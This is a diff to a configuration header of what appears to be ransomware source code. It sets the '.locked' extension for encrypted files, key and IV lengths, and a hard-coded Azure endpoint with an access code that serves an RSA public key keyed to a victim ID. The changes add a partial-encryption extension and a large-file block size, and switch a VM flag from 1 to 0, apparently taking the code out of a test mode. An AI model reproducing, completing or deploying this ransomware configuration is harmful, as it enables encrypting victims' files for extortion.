@@ -3,6 +3,7 @@
 * Extension for all locked files
 */
 #define LOCKED_EXTENSION ".locked"
+#define PART_LOCKED_EXT  ".loked"
 
 /*
 * Key length in bytes, default is 32 (256 bits)
@@ -26,6 +27,8 @@
 
 #define ID_LEN (256/8) // 256 bits
 
+#define BIG_FILE_BLOCK_SIZE (50 * 1L << 20);
+
 #define ENCRYPTED_KEY_IV_LEN (1024/8)
 
 #define URL_PUBLIC_RSA R"(https://squanchedhttpexample.azurewebsites.net/api/GetPublicKey?code=/JhagZr0xhT/CfqmBa/B0csng8kQKhPCXo7xjnfWJOD6P0sgITy4GQ==&&ID=)"
@@ -33,7 +36,7 @@
 #define FINISHED_ENCRYPTION '1'
 #define NOT_FINISHED_ENCRYPTION '0'
 
-#define VM 1
+#define VM 0
 
 /*
  * Size sum before removing the plaintext 
